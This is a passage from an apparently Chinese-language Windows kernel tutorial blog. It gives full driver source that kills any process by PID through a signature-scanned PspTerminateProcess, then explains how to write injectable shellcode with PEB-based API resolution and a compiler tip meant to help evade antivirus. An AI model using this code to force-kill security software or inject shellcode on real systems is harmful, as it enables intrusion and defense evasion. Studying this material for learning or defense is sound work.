class="line"></span><br></pre></td></tr></table></figure>

<p>0环驱动代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\MathsDriverDev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\??\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span>;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span>;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">KillProc</span><span class="params">(PDRIVER_OBJECT driver,ULONG uPID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line">PDRIVER_OBJECT g_pDriver = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;<span class="comment">//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中,双链表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;<span class="comment">//系统已经启动,没有被初始化,没有调用DriverEntry这个历程的时候,通过这个链表进程串接起来</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;<span class="comment">//已经调用DriverEntry这个函数的所有驱动程序</span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry</span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG Status;</span><br><span class="line">	ULONG uIndex = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>; <span class="comment">// 设备对象指针</span></span><br><span class="line">	UNICODE_STRING DeviceName; <span class="comment">// 设备名，0环用</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName; <span class="comment">// 符号链接名，3环用</span></span><br><span class="line">	g_pDriver = pDriver;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName,DEVICE_NAME);</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	Status = IoCreateDevice(pDriver,<span class="number">0</span>,&amp;DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> Status;</span><br><span class="line">	&#125;</span><br><span class="line">	DbgPrint(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 设置交互数据的方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);</span><br><span class="line">	<span class="comment">// 设置分发函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;</span><br><span class="line">	<span class="comment">// 设置卸载函数</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">// 删除符号链接，删除设备</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动卸载成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置这个函数，则Ring3调用CreateFile会返回1</span></span><br><span class="line"><span class="comment">// IRP_MJ_CREATE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CLOSE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层断开连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_DEVICE_CONTROL 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// DbgPrint(&quot;IrpDeviceControlProc.\n&quot;);</span></span><br><span class="line">	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	ULONG uIoControlCode;</span><br><span class="line">	PVOID pIoBuffer;</span><br><span class="line">	ULONG uInLength;</span><br><span class="line">	ULONG uOutLength;</span><br><span class="line">	ULONG uRead1;</span><br><span class="line">	ULONG uWrite1;</span><br><span class="line">	ULONG uWrite2;</span><br><span class="line">	BOOLEAN bRet = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置临时变量的值</span></span><br><span class="line">	uRead1 = <span class="number">0</span>;</span><br><span class="line">	uWrite1 = <span class="number">1</span>;</span><br><span class="line">	uWrite2 = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 获取IRP数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> OPERADD:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead1,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			<span class="comment">//执行结束进程</span></span><br><span class="line">			bRet = KillProc(g_pDriver,uRead1);</span><br><span class="line">			<span class="keyword">if</span>(bRet == TRUE)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite1, <span class="number">4</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite2, <span class="number">4</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">4</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">KillProc</span><span class="params">(PDRIVER_OBJECT driver,ULONG uPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulShellCode[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x0124a164</span>, <span class="number">0x758b0000</span>, <span class="number">0x44703b08</span>, <span class="number">0x0db80775</span>,</span><br><span class="line">		<span class="number">0xebc00000</span>, <span class="number">0xbe8d575a</span>, <span class="number">0x00000248</span>, <span class="number">0x200147f6</span>,</span><br><span class="line">		<span class="number">0x868d1274</span>, <span class="number">0x00000174</span></span><br><span class="line">	&#125;;</span><br><span class="line">	ULONG ulRet = <span class="number">0</span>;</span><br><span class="line">	PVOID DllBase = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG SizeOfImage = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*_PspTerminateProcess)</span><span class="params">(PEPROCESS pEprocess, NTSTATUS ExitCode)</span></span>;</span><br><span class="line">	_PspTerminateProcess PspTerminateProcess;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ulRet = GetKernelMoudleInfo(driver,&amp;DllBase,&amp;SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!ulRet)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;驱动程序获取ntoskrnl.exe模块失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	PspTerminateProcess = (_PspTerminateProcess)Find_FeatureCode((PVOID)ulShellCode,<span class="keyword">sizeof</span>(ulShellCode),DllBase,SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!PspTerminateProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;PspTerminateProcess特征码搜索失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PsLookupProcessByProcessId((HANDLE)uPID,&amp;pEprocess); <span class="comment">// 记事本PID</span></span><br><span class="line">	PspTerminateProcess(pEprocess, <span class="number">0</span>);</span><br><span class="line">	DbgPrint(<span class="string">&quot;PID为%d的进程被 PspTerminateProcess 函数关闭了.\r\n&quot;</span>,uPID);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Head = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Tail = <span class="literal">NULL</span>;</span><br><span class="line">	UNICODE_STRING UnicodeMoudleName = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	</span><br><span class="line">	RtlInitUnicodeString(&amp;UnicodeMoudleName,<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pLDR_Head = (PLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class="line">	pLDR_Tail = pLDR_Head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareUnicodeString(&amp;pLDR_Tail-&gt;BaseDllName, &amp;UnicodeMoudleName, TRUE) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			*DllBase = pLDR_Tail-&gt;DllBase;</span><br><span class="line">			*SizeOfImage = pLDR_Tail-&gt;SizeOfImage;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//pLDR_Blink = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pLDR_Flink,LDR_DATA_TABLE_ENTRY,InLoadOrderLinks);</span></span><br><span class="line">		pLDR_Tail = (PLDR_DATA_TABLE_ENTRY)pLDR_Tail-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(pLDR_Head != pLDR_Tail);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulDllLastByte = <span class="number">0</span>;</span><br><span class="line">	PVOID pNextByte = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pNextByte = DllBase;</span><br><span class="line">	ulDllLastByte = (ULONG)DllBase + ulSizeOfImage;</span><br><span class="line">	<span class="keyword">while</span>((ULONG)pNextByte + ulShellCode_Len &lt;= ulDllLastByte)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareMemory(pNextByte,pShellCode,ulShellCode_Len) == ulShellCode_Len)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> (PVOID)((ULONG)pNextByte - <span class="number">6</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		pNextByte = (PVOID)((ULONG)pNextByte + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-驱动中的全局变量"><a href="#2-驱动中的全局变量" class="headerlink" title="2 驱动中的全局变量"></a>2 驱动中的全局变量</h2><p>在编写驱动中发现，使用全局变量或<code>static</code>变量，<strong>它们的地址是会变的</strong>，像局部变量一样，全局变量每次调用驱动函数都会重新初始化。</p>
<p>在驱动程序中应该尽量避免使用全局变量，因为全局变量会导致不同步的问题，解决办法之一就是可将全局变量存储在设备扩展中（使用指针指向设备扩展的内存块），将指针作为一个全局变量来使用。</p>
<div class="note primary"><p>设备扩展（DEVICE_EXTENSION）是与设备对象相关的另一种重要的数据结构。可以用它来保存与特定设备关联的信息。设备扩展其实只是一个未分页的池，由驱动开发者来定义它的大小和内容。并由I&#x2F;O管理器自动把它分配给设备对象，即设备对象的<code>PVOID DeviceExtension</code>字段。由于此结构是驱动开发者自定义的，所以必须要让系统知道需要给此结构预留多少空间，因此要把设备扩展结构的大小作为参数传递给<code>IoCreateDevice</code>函数。I&#x2F;O管理器的<code>IoCreateDevice</code>函数将为设备对象和设备扩展对象在非分页内存池内申请内存。</p>
<ul>
<li><mark class="label warning">非分页内存池</mark>：内存页<mark class="label danger">不可以</mark>交换出内存。</li>
<li><mark class="label default">分页内存池</mark>：内存页可以交换出内存。</li>
</ul>
</div>

<p>使用<code>IoCreateDevice</code>函数创建设备时，可以指定当前设备要使用的非分页内存的大小，由成员<code>DeviceExtensionSize</code>来指定大小。然后由对象的成员<code>DeviceExtension</code>指向这块内存。这块内存本来是用来存设备相关信息的，但是可以由开发者决定存啥，将其转为<code>PVOID</code>使用即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">  CSHORT             Type;</span><br><span class="line">  CSHORT             Size;</span><br><span class="line">  PDEVICE_OBJECT     DeviceObject;</span><br><span class="line">  ULONG              Flags;</span><br><span class="line">  PVOID              DriverStart;</span><br><span class="line">  ULONG              DriverSize;</span><br><span class="line">  PVOID              DriverSection;</span><br><span class="line">  PDRIVER_EXTENSION  DriverExtension;</span><br><span class="line">  UNICODE_STRING     DriverName;</span><br><span class="line">  PUNICODE_STRING    HardwareDatabase;</span><br><span class="line">  PFAST_IO_DISPATCH  FastIoDispatch;</span><br><span class="line">  PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">  PDRIVER_STARTIO    DriverStartIo;</span><br><span class="line">  PDRIVER_UNLOAD     DriverUnload;</span><br><span class="line">  PDRIVER_DISPATCH   MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line">&#125; DRIVER_OBJECT, *PDRIVER_OBJECT;</span><br></pre></td></tr></table></figure>



<h2 id="3-编写ShellCode"><a href="#3-编写ShellCode" class="headerlink" title="3 编写ShellCode"></a>3 编写ShellCode</h2><h3 id="3-1-ShellCode定义"><a href="#3-1-ShellCode定义" class="headerlink" title="3.1 ShellCode定义"></a>3.1 ShellCode定义</h3><p>Shellcode是不依赖环境，放到任何地方都可以执行的机器码。</p>
<p>将一个函数模块注入到其他进程中，这个函数的硬编码就成为ShellCode，这种注入叫做代码注入&#x2F;ShellCode注入</p>
<h3 id="3-2-ShellCode编写原则"><a href="#3-2-ShellCode编写原则" class="headerlink" title="3.2 ShellCode编写原则"></a>3.2 ShellCode编写原则</h3><p>ShellCode编写原则有很多，下面列举一些必须要掌握的。</p>
<div class="note danger"><p>关于ShellCode注入应该注意（编写规则）：<br>1、不要使用全局变量（当前程序的全局变量地址在其他进程不可用）<br>2、不要使用常量字符串（全局变量）<br>3、不能直接调用系统函数（不能使用IAT）<br>4、不能嵌套调用其他函数(全局变量)<br>5、<a href="https://www.cnblogs.com/thresh/p/12609659.html">注意编译器的一些设置</a></p>
</div>

<p><strong>1、不要使用全局变量。</strong></p>
<p>因为我们编写ShellCode时，使用的全局变量是自己的进程里面的全局变量，注入到别的进程里，这个地址就没用了。</p>
<p><strong>2、不要使用常量字符串</strong>。</p>
<p>因为字符串常量值也是<strong>全局变量</strong>，注入到别的进程里，根本没有这个字符串。</p>
<p><strong>⚠️替代方法</strong>：要使用字符串，请使用字符数组。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> s[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>3、不能直接调用系统函数（不能使用IAT）。</strong></p>
<p>如在程序中使用<code>MessageBox(0,0,0,0)</code>，调用系统函数的方式是间接调用（FF15），需要从IAT表里获取API地址，每个进程的IAT表位置不同，且对方的进程可能没有导入你需要调用的函数的DLL，那么你是不能调用这个系统函数的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040227B</span>	FF15 <span class="number">44</span>C14000 call dword ptr ds:[<span class="number">0x40C144</span>]</span><br></pre></td></tr></table></figure>

<p>这里的<code>0x40C144</code>就是<strong>全局变量</strong>的地址。</p>
<p>所以我们需要用到 LoadLibrary 和 GetProcAddress 这两个函数，来动态获取系统API的函数指针。</p>
<p>但是 LoadLibrary，GetProcAddress 本身就是系统函数，它们本身就依赖IAT表，咋办呢？</p>
<p>解决方案是这样的：通过FS:[0x30] 找到PEB，然后通过PEB里的LDR链表 [PEB+0x0C]找到 kernel32.dll 的地址，然后我们遍历它的 IAT表，找到 LoadLibrary 和 GetProcAddress 函数。</p>
<p><strong>4、不能嵌套调用其他函数。</strong><br>和前两点道理是一样的，本进程里的函数地址，拿到别的进程的虚拟地址空间是无效的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> Num = Plus(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">call <span class="number">004027B</span>0</span><br></pre></td></tr></table></figure>

<p>这里的<code>0x004027B0</code>即为<code>Plus</code>的地址，是一个<strong>全局变量</strong>。</p>
<p><strong>5、注意编译器的一些设置。</strong>（《Rootkit：系统灰色地带的潜伏者 第2版》）</p>
<p><img data-src="https://s2.loli.net/2022/01/22/apg2ktFxdJiQN3U.png" alt="31.png"></p>
<p>特别注意：</p>
<ul>
<li>运行时检查：可以设置成关闭，或者代码编译时选择<code>release</code>，这样就不会有堆栈检查<code>_checksp</code>函数。</li>
<li>关闭缓冲区安全检查（GS选项）：ShellCode中没有这些信息，方便免杀。</li>
</ul>
<p>可以参考：</p>
<ul>
<li><a href="https://blog.csdn.net/Kwansy/article/details/116261142">关闭生成调试信息和嵌入清单</a></li>
<li><a href="https://blog.csdn.net/Kwansy/article/details/112957763?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164278456416781685371117%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=164278456416781685371117&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-112957763.nonecase&utm_term=DEP&spm=1018.2226.3001.4450">&#x2F;GS 编译选项，_security_cookie，软件强制DEP</a></li>
<li><a href="https://blog.csdn.net/Kwansy/article/details/112919717">使数据区“可执行”的几种常规办法</a></li>
<li><a href="https://www.anquanke.com/post/id/222280#h2-0">Windows下Shellcode开发</a></li>
</ul>
<div class="note primary"><p>代码注入：（原理都是线程注入）<br><strong>⚠️注意</strong>：类型定义不属于全局变量！！！</p>
</div>




<h3 id="3-3-ShellCode示例"><a href="#3-3-ShellCode示例" class="headerlink" title="3.3 ShellCode示例"></a>3.3 ShellCode示例</h3><p>本例编写一个函数，该函数：</p>
<ol>
<li>利用<code>fs:[30]</code>获取PEB起始地址。</li>
<li>根据<code>PEB-&gt;InLoadOrderModuleList.Flink;</code>获取<code>PLDR_DATA_TABLE_ENTRY</code>。</li>
<li>根据Unicode结构<code>BaseDllName</code>和Unicode模块名称<code>kernel32.dll</code>进行对比获取模块加载基址。</li>
<li>根据<code>kernel32.dll</code>的基址获取导出表中的函数<code>GetProcAddress</code>的地址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="comment">//后面的成员暂时用不到，就不列举了</span></span><br><span class="line">&#125; 